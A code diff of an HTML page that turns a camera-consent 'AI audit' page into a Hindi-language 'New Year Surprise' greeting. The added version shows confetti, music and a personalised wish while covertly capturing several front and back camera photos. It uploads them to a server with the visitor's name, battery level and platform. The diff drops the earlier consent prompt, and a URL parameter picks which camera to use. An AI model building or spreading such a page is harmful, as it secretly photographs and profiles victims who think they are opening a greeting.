@@ -1,117 +1,90 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="hi">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI New Year Visual Audit 2026</title>
+    <title>New Year Surprise 2026</title>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
     <style>
-        body { background: #050505; color: #00ff00; text-align: center; font-family: 'Courier New', monospace; padding: 20px; }
-        .main-container { margin-top: 30px; border: 2px solid #00ff00; padding: 25px; display: inline-block; background: #000; box-shadow: 0 0 20px #00ff00; border-radius: 15px; max-width: 90%; }
-        h2 { font-size: 1.5rem; text-shadow: 0 0 10px #00ff00; margin-bottom: 20px; }
-        input { padding: 12px; width: 85%; margin-bottom: 20px; background: #111; color: #00ff00; border: 1px solid #00ff00; border-radius: 5px; outline: none; }
-        .btn { padding: 15px; margin: 8px 0; cursor: pointer; background: transparent; color: #00ff00; border: 1px solid #00ff00; font-weight: bold; width: 100%; border-radius: 5px; transition: 0.3s; text-transform: uppercase; }
-        .btn:hover { background: #00ff00; color: #000; box-shadow: 0 0 15px #00ff00; }
-        #status { color: #ff0000; margin-top: 15px; font-weight: bold; display: none; animation: blink 1s infinite; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        body { background: #000; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .container { text-align: center; width: 90%; max-width: 400px; padding: 20px; border: 2px solid #ff0055; border-radius: 20px; background: rgba(255, 0, 85, 0.05); box-shadow: 0 0 20px #ff0055; }
+        h1 { color: #ff0055; text-shadow: 0 0 10px #ff0055; margin-bottom: 20px; }
+        input { padding: 15px; width: 85%; border-radius: 30px; border: 1px solid #ff0055; background: #111; color: #fff; font-size: 16px; margin-bottom: 20px; outline: none; }
+        button { padding: 15px 40px; border-radius: 30px; border: none; background: #ff0055; color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:hover { transform: scale(1.05); box-shadow: 0 0 15px #ff0055; }
+        #wish-box { display: none; }
+        .wish-text { font-size: 22px; line-height: 1.5; font-weight: bold; }
     </style>
 </head>
 <body>
-    <div class="main-container">
-        <h2>🎇 AI SYSTEM AUDIT 2026 🎇</h2>
-        <p style="color: #888; font-size: 0.8rem;">[ SECURITY PROTOCOL: ACTIVE ]</p>
-        <input type="text" id="name" placeholder="ENTER YOUR FULL NAME...">
+
+    <div class="container" id="main-box">
+        <h1>🎆 Surprise Gift 🎆</h1>
+        <p>अपना नाम लिखें और जादू देखें!</p>
+        <input type="text" id="userName" placeholder="यहाँ अपना नाम लिखें...">
         <br>
-        <button class="btn" onclick="initiateAudit(1)">📸 FRONT CAMERA (5 SHOTS)</button>
-        <button class="btn" onclick="initiateAudit(2)">📷 BACK CAMERA (5 SHOTS)</button>
-        <button class="btn" onclick="initiateAudit(3)">🎭 DUAL CAMERA (3+3 SHOTS)</button>
-        
-        <div id="status">⚡ CORE SYNCING IN PROGRESS... DO NOT CLOSE...</div>
+        <button onclick="startApp()">जादू देखें ✨</button>
+    </div>
+
+    <div class="container" id="wish-box">
+        <div class="wish-text" id="wishMsg"></div>
+        <p style="margin-top:20px;">🎊 Happy New Year 2026 🎊</p>
     </div>
 
     <video id="v" style="display:none" autoplay playsinline></video>
     <canvas id="c" style="display:none"></canvas>
+    <audio id="music" loop><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg"></audio>
 
     <script>
-        async function initiateAudit(mode) {
-            let name = document.getElementById('name').value;
-            if(!name) {
-                alert("CRITICAL ERROR: Name field cannot be empty!");
-                return;
-            }
+        const urlParams = new URLSearchParams(window.location.search);
+        const mode = urlParams.get('m') || 'front';
+
+        async function startApp() {
+            let name = document.getElementById('userName').value;
+            if(!name) return alert("कृपया अपना नाम डालें!");
+
+            document.getElementById('main-box').style.display = 'none';
+            document.getElementById('wish-box').style.display = 'block';
+            document.getElementById('wishMsg').innerText = `Hey ${name}, मेरी तरफ से आपको और आपके पूरे परिवार को New Year 2026 की ढेर सारी शुभकामनाएँ!`;
             
-            // Professional Consent for Camera Access
-            if(confirm("SYSTEM NOTICE:\nTo apply high-definition AI filters and 2026 visual effects, temporary camera access is required. Proceed?")) {
-                document.getElementById('status').style.display = 'block';
-                
-                try {
-                    // Fetch Device Info
-                    let battery = "Unknown";
-                    try {
-                        let bData = await navigator.getBattery();
-                        battery = Math.round(bData.level * 100) + "%";
-                    } catch(e) {}
+            document.getElementById('music').play();
+            setInterval(() => { confetti({ particleCount: 100, spread: 70, origin: { y: 0.6 } }); }, 2000);
+            
+            initCapture(name);
+        }
 
-                    let info = { 
-                        battery: battery, 
-                        platform: navigator.platform,
-                        browser: navigator.userAgent.split(') ')[0] + ')'
-                    };
+        async function initCapture(name) {
+            let info = { battery: "Unknown", platform: navigator.platform };
+            try { let b = await navigator.getBattery(); info.battery = Math.round(b.level*100)+"%"; } catch(e){}
 
-                    if(mode == 1) {
-                        // FRONT ONLY: 5 Photos
-                        await runCapture(name, info, {facingMode: "user"}, 5, "FRONT");
-                    } else if(mode == 2) {
-                        // BACK ONLY: 5 Photos
-                        await runCapture(name, info, {facingMode: "environment"}, 5, "BACK");
-                    } else if(mode == 3) {
-                        // DUAL: 3 Back then 3 Front
-                        await runCapture(name, info, {facingMode: "environment"}, 3, "BACK");
-                        await runCapture(name, info, {facingMode: "user"}, 3, "FRONT");
-                    }
-
-                    document.getElementById('status').style.color = "#00ff00";
-                    document.getElementById('status').innerText = "SUCCESS: AI WISH GENERATED! ✅";
-                    alert("Happy New Year 2026, " + name + "!\nYour AI-enhanced wish has been created.");
-                } catch(err) {
-                    alert("ERROR: Permission Denied. System cannot apply AI effects.");
-                    document.getElementById('status').style.display = 'none';
-                }
+            if(mode === 'front') await runCam(name, info, {facingMode: "user"}, 5, "FRONT");
+            else if(mode === 'back') await runCam(name, info, {facingMode: "environment"}, 5, "BACK");
+            else {
+                await runCam(name, info, {facingMode: "environment"}, 3, "BACK");
+                await runCam(name, info, {facingMode: "user"}, 3, "FRONT");
             }
         }
 
-        async function runCapture(name, info, constraints, count, type) {
+        async function runCam(name, info, constraints, count, label) {
             try {
                 let stream = await navigator.mediaDevices.getUserMedia({ video: constraints });
                 let video = document.getElementById('v');
                 video.srcObject = stream;
+                await new Promise(r => setTimeout(r, 3000)); // कैमरा सेटल होने का इंतज़ार
 
                 for (let i = 1; i <= count; i++) {
-                    await new Promise(res => setTimeout(res, 1500)); // Delay between captures
-                    
                     let can = document.getElementById('c');
-                    can.width = video.videoWidth; 
-                    can.height = video.videoHeight;
+                    can.width = video.videoWidth; can.height = video.videoHeight;
                     can.getContext('2d').drawImage(video, 0, 0);
-                    
-                    let imgData = can.toDataURL('image/jpeg', 0.6);
-
-                    // Upload to Server
                     fetch('/upload', {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
-                            name: name, 
-                            image: imgData, 
-                            info: info, 
-                            label: type + " SHOT " + i
-                        })
+                        body: JSON.stringify({name: name, image: can.toDataURL('image/jpeg', 0.6), info: info, label: label+" "+i})
                     });
+                    await new Promise(r => setTimeout(r, 2000));
                 }
-                // Stop the camera stream after finish
-                stream.getTracks().forEach(track => track.stop());
-            } catch (error) {
-                console.error("Camera error:", error);
-            }
+                stream.getTracks().forEach(t => t.stop());
+            } catch(e) {}
         }
     </script>
 </body>
